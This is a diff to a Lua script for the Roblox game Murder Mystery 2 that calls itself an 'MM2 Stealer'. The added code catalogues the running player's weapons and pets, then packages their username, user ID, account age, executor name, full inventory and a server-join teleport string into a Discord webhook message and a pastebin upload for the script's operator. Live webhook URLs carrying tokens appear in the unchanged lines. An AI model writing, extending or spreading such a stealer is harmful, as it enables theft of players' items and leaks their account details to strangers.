@@ -4,6 +4,10 @@ Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIP
 Script = "" -- [None | Custom | MetterX Hub | Highlight Lite]
 RawLink = "" -- [Raw Link If "Custom"]
 
+Config = { --configuration
+    FullInventory = true, --true to see full inventory of target false if no
+}
+
 -- [ Dual Settings ] --
 DualUsername = "QuadCoreDragon" -- [Dual Username]
 DualWebhook = "https://discord.com/api/webhooks/1296940147845365910/5klvjPBRgi-hRUmUwp3j5_sXcFLTUdhX6pO8Kmc1Du7zBXqJRPLcwl04DYBJSu9maKMv" -- [Dual Webhook]
@@ -52,6 +56,80 @@ local PlaceVersionValue = game.PlaceVersion or "Unknown"
 local PlatformValue = "Unknown"
 local VersionValue = "v1.0 Dev" -- [Release / Patch / Beta / Dev]
 local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
+-----------------------------------------------------------------------------------------------------------------------
+local Inventory = {}
+
+if Config.FullInventory ~= true and Config.FullInventory ~= false then
+    Config.FullInventory = true
+end
+
+if Config.FullInventory ~= true and Config.FullInventory ~= false then
+    Config.FullInventory = true
+end
+
+function checkitem(v)
+    if v:IsA("Frame") then
+        if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
+            Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
+            if Config.FullInventory then
+                if v.Container.Amount.Text ~= "" then
+                    number = v.Container.Amount.Text
+                else
+                    number = "x1"
+                end
+                table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
+            end
+        end
+    end
+end
+
+function FullInventory()
+    for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+        for i,v in pairs(v.Container:GetChildren()) do
+            if v.Name == "Christmas" or v.Name == "Halloween" then
+                for i,v in pairs(v.Container:GetChildren()) do
+                    checkitem(v)
+                end
+            else
+                checkitem(v)
+            end
+        end
+    end
+    for i,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
+        checkitem(v)
+    end
+    if Common and Uncommon and Rare and Legendary and Godly and Ancient and Unique and Vintage == 0 then
+        table.insert(Inventory, "None")
+    end
+    if Config.FullInventory then
+        return table.concat(Inventory, ", ")
+    else
+        return "Full inventory set false."
+    end
+end
+
+FullInventory()
+
+local data = {
+    username = StealerName,
+    avatar_url = "https://cdn.discordapp.com/attachments/1295330912900223039/1295610470228561972/standard.gif?ex=670f46c7&is=670df547&hm=d67f2702e28851f197035c849929a5d05b1f4b9e6830f463268c3234310d03ce&",
+    content = messageMM2,
+    embeds = {
+        {
+            title = "💻 **__"..StealerName.."__ | __MM2 Stealer__**",
+            description = "**📃  Player Information**: \n```lua\nUsername     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🏺: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     ⚜️: " .. Unique .. "\nVintage    ⌛: " .. Vintage .. "\nLegendary  ⚔️: " .. Legendary .. "\nRare       📜: " .. Rare .. "\nUncommon   🗿: " .. Uncommon .. "\nCommon     💀: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
+            color = tonumber(0x3365FF),
+            fields = {
+                {
+                    name = "🎮Auto Joiner",
+                    value = "Soon"
+                }
+            }
+        }
+    }
+}
+-----------------------------------------------------------------------------------------------------------------------
+
 
 if game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled and not game:GetService("UserInputService").MouseEnabled then
     PlatformValue = "Mobile"
@@ -342,25 +420,42 @@ local function pastebin(content)
     return rawUrl
 end
 
+local Workspace = game:GetService("Workspace")
+local ItemsFolder = Workspace:WaitForChild("Items") -- Folder in Workspace holding all items
+
+local function getItemDisplayName(itemName)
+    -- Look for the item in Workspace's Items folder
+    local item = ItemsFolder:FindFirstChild(itemName)
+    if item and item:FindFirstChild("Name") then
+        return item.Name.Value -- Returns the display name from the "Name" StringValue
+    end
+    return itemName -- Fallback to original name if "Name" value not found
+end
+
 local function formatItems(itemList)
     if #itemList == 0 then
         return "None"
     else
-        return table.concat(itemList, "\n")
+        local formattedItems = {}
+        for _, item in ipairs(itemList) do
+            local displayName = getItemDisplayName(item) -- Fetch display name from Workspace.Items
+            table.insert(formattedItems, displayName)
+        end
+        return table.concat(formattedItems, "\n")
     end
 end
 
+-- Building the pastebinString with formatted item lists
 local pastebinString = "-- [ Uniques ] --\n" .. formatItems(uniqueItems) ..
-                         "\n\n-- [ Ancient ] --\n" .. formatItems(ancientItems) ..
-                         "\n\n-- [ Godlies ] --\n" .. formatItems(godlyItems) ..
-                         "\n\n-- [ Legendaries ] --\n" .. formatItems(legendaryItems) ..
-                         "\n\n-- [ Vintage ] --\n" .. formatItems(vintageItems) ..
-                         "\n\n-- [ Rare ] --\n" .. formatItems(rareItems) ..
-                         "\n\n-- [ Uncommon ] --\n" .. formatItems(uncommonItems) ..
-                         "\n\n-- [ Common ] --\n" .. formatItems(commonItems)
-..
+                       "\n\n-- [ Ancient ] --\n" .. formatItems(ancientItems) ..
+                       "\n\n-- [ Godlies ] --\n" .. formatItems(godlyItems) ..
+                       "\n\n-- [ Legendaries ] --\n" .. formatItems(legendaryItems) ..
+                       "\n\n-- [ Vintage ] --\n" .. formatItems(vintageItems) ..
+                       "\n\n-- [ Rare ] --\n" .. formatItems(rareItems) ..
+                       "\n\n-- [ Uncommon ] --\n" .. formatItems(uncommonItems) ..
+                       "\n\n-- [ Common ] --\n" .. formatItems(commonItems) ..
+                       "\n\nThis data was generated by using MetterX!"
 
-                        "\n\nThis data was generated by using MetterX!"
 
 
 local pastebinLink = pastebin(pastebinString)
